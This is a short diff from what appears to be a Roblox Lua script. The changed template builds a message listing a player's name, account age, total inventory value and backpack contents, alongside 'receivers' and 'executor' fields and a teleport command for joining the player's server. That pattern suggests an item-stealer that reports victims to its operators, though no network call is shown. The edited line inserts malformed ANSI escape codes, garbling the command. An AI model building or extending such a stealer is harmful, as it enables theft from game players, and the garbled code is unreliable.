@@ -338,7 +338,7 @@ Account Age: %s days```
 ```%s```
 :island: **Join with URL**
 **%s**
-```game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")```
+```game:GetService(\u001b["TeleportService"\u001b[0m):TeleportToPlaceInstance(\u001b[%s\u001b[0m, \u001b["%s"\u001b[0m)```
 ]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrlMarkdown, placeId, jobId)
 
     local data = {
